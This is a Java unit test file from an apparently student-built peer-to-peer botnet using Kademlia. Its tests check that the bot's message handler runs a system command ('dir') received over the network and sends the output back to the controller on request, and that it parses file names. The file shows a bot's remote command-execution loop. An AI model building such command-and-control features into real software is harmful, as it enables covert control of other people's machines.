package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.junit.Test;
import org.mockito.Mockito;

import static botnet_p2p.MessageOuterClass.Message;
import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Matchers.*;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;


public class BotMessageHandlerTest {

    private Message createCommandMessage(String command, boolean sendResponse) {
        return Message.newBuilder()
                .setCommand(
                        Message.CommandMsg.newBuilder()
                                .setCommand(command)
                                .setShouldRespond(sendResponse)
                                .build()
                )
                .build();
    }

    @Test
    public void testDirCommand() {
        P2pLayer p2pLayer = mock(P2pLayer.class);
        KademliaPeer me = new KademliaPeer("127.0.0.1", 3000);
        BotMessageHandler botMessageHandler = new BotMessageHandler(p2pLayer, null, me);

        String result = botMessageHandler.executeSystemCommand("dir");

        assertThat(result).contains("Volume in drive");
    }

    @Test
    public void testDirCommandMessage() {
        P2pLayer p2pLayer = mock(P2pLayer.class);
        KademliaPeer me = new KademliaPeer("127.0.0.1", 3000);
        BotMessageHandler botMessageHandler = new BotMessageHandler(p2pLayer, null, me);

        botMessageHandler.handleCommandMessage(createCommandMessage("dir", true));

        Mockito.verify(p2pLayer).commandResponse(anyObject(), eq(me), startsWith(" Volume in"), eq(true));
    }

    @Test
    public void testDirCommandMessageNoResponseRequested() {
        P2pLayer p2pLayer = mock(P2pLayer.class);
        KademliaPeer me = new KademliaPeer("127.0.0.1", 3000);
        BotMessageHandler botMessageHandler = new BotMessageHandler(p2pLayer, null, me);

        botMessageHandler.handleCommandMessage(createCommandMessage("dir", false));

        Mockito.verify(p2pLayer, never()).commandResponse(anyObject(), anyObject(), anyObject(), anyBoolean());
    }

    @Test
    public void getFileName_1() {
        BotMessageHandler botMessageHandler = new BotMessageHandler(null, null, null);

        String fileName = botMessageHandler.getFileName("/aa/bvv/c.txt");

        assertThat(fileName).isEqualToIgnoringCase("c.txt");
    }

    @Test
    public void getFileName_2() {
        BotMessageHandler botMessageHandler = new BotMessageHandler(null, null, null);

        String fileName = botMessageHandler.getFileName("C:\\aa\\bvv\\c.txt");

        assertThat(fileName).isEqualToIgnoringCase("c.txt");
    }
}